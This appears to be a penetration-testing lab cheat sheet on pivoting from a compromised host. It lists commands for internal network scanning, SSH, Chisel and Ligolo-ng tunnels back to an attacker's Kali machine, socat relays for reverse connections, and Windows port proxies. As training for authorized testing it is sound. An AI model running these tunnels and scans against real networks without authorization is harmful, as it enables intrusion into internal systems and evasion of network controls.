## Pivoting

Pivot only after documenting the route that is missing: source, destination,
protocol, port, and the host that can reach both sides.

### Map the network

#### Linux

```bash
ip addr
ip route
ip neigh
ss -lntup
cat /etc/resolv.conf
cat /proc/net/fib_trie
for h in 10.10.10.{1..254}; do timeout 1 bash -c "</dev/tcp/$h/445" 2>/dev/null && echo "$h:445"; done
```

#### Windows

```powershell
ipconfig /all
route print
arp -a
netstat -ano
Get-NetTCPConnection -State Listen
Get-NetRoute -AddressFamily IPv4
Test-NetConnection 10.10.10.20 -Port 445
1..254 | ForEach-Object { if (Test-Connection "10.10.10.$_" -Count 1 -Quiet) { "10.10.10.$_" } }
```

Look for additional interfaces, internal DNS servers, local-only listeners, and
routes unavailable from Kali.

### SSH local forwarding

Expose a service reachable from the SSH server on a local Kali port.

```bash
ssh -N -L 127.0.0.1:8443:10.10.10.20:443 "$USER@$IP"
ssh -N -L 127.0.0.1:1445:10.10.10.20:445 -o ExitOnForwardFailure=yes "$USER@$IP"
```

Use `https://127.0.0.1:8443` locally. If the application depends on a hostname,
preserve its Host header or TLS server name.

### SSH dynamic forwarding

Create a SOCKS proxy through the SSH server.

```bash
ssh -N -D 127.0.0.1:1080 "$USER@$IP"
ssh -N -D 127.0.0.1:1080 -o ServerAliveInterval=30 -o ExitOnForwardFailure=yes "$USER@$IP"
```

Configure ProxyChains:

```text
socks5 127.0.0.1 1080
```

```bash
proxychains -q nmap -sT -Pn -n -p 80,445,3389 10.10.10.20
proxychains -q curl http://10.10.10.20/
```

Use TCP connect scans through SOCKS. Raw-packet SYN and UDP scans do not traverse
a standard SOCKS proxy.

### SSH remote forwarding

Expose a service reachable from the SSH client to the SSH server side.

```bash
ssh -N -R 8080:127.0.0.1:8000 "$USER@$IP"
```

Forward every route automatically when SSH access is available:

```bash
sshuttle -r "$USER@$IP" 10.10.10.0/24 --dns
```

This is useful when the compromised host cannot connect directly to Kali but can
reach an SSH server.

### Chisel

Run the server on Kali:

```bash
chisel server --reverse --port 8000
```

Run the client on the pivot:

```bash
chisel client "$LHOST:8000" R:socks
```

The reverse SOCKS listener defaults to port 1080 on the server. Confirm the
actual listener before configuring ProxyChains.

Forward one internal service instead:

```bash
chisel client "$LHOST:8000" R:8443:10.10.10.20:443
```

Standard forward mode:

```bash
chisel server --port 8000
chisel client "$LHOST:8000" 127.0.0.1:8443:10.10.10.20:443
```

### Ligolo-ng

Start the proxy on Kali:

```bash
sudo ip tuntap add user "$USER" mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
```

Connect the agent from the pivot:

```bash
./agent -connect "$LHOST:11601" -ignore-cert
```

After selecting the session and starting the tunnel, add only the required route:

```bash
sudo ip route add 10.10.10.0/24 dev ligolo
```

Confirm and later remove the route:

```bash
ip route show dev ligolo
sudo ip route del 10.10.10.0/24 dev ligolo
sudo ip link del ligolo
```

## Socat forwarding

Forward a TCP port from a Linux pivot:

```bash
socat TCP-LISTEN:8443,fork,reuseaddr TCP:10.10.10.20:443
```

Relay a reverse connection through the pivot:

```bash
socat TCP-LISTEN:4444,fork,reuseaddr TCP:"$LHOST":4444
```

## Windows port proxy

With suitable administrative access:

```powershell
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8443 connectaddress=10.10.10.20 connectport=443
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=8443
```

Use Ligolo listeners for reverse connections that must traverse the pivot. Remove
routes and interfaces after the lab.

### Reach a localhost-only service

SSH example:

```bash
ssh -N -L 127.0.0.1:5432:127.0.0.1:5432 "$USER@$IP"
```

Then connect to `127.0.0.1:5432` locally. Verify the remote listener with
`ss`, `netstat`, or `Get-NetTCPConnection` before forwarding it.

### Troubleshooting

- Test the destination directly from the pivot before debugging the tunnel.
- Confirm which side owns each listening port.
- Check local binding conflicts with `ss -lntp`.
- Use TCP connect scans through application-layer proxies.
- Remember that DNS may resolve on the wrong side of a proxy.
- Narrow routes and forwards to the required networks and services.
- If a reverse connection fails, verify its return path independently.
